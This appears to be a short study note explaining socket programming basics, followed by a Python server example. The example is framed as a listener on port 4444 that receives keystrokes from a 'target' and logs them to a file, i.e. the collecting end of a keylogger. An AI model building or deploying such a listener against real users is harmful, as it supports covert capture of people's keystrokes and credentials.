Socket programming is a way to enable communication between two devices over a network. Allows devices send and receive data through a connection, such devices we refer to as **sockets**. These sockets can communicate using different protocols, but most often TCP or UDP.

Usually used in the context of: **client-server**, still its possible to use socket programming for client to client, and in situations with multiple clients and servers.  


**Socket properties:**
- IP address 
- Port number. 
- Listen for incoming connections 
- Communicate (Read and write)
- Can be open/closed
- Low-level & flexible 

**Usage:**
- Custom network protocols, real time applications 
- Scenarios requiring fine-grind control over data transmission. 
- Good for transferring files with build in commands for file operations. 



( Client needs the servers IP / Port for it to connect to the server. ) 




Setting up a basic server socket in python:
- It listens for incoming connections. 
- Read keystrokes from target.
- Logs keystrokes

````python 

import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 4444))
    server_socket.listen(1)
    print("Server listening on port 4444")

    conn, addr = server_socket.accept()
    print(f"Connection from {addr}")

    with open("received_keystrokes.txt", "a") as file:
        while True:
            data = conn.recv(1024).decode("utf-8")
            if not data:
                break
            print(f"Received: {data}")
            file.write(data)
            file.flush()

    conn.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
```
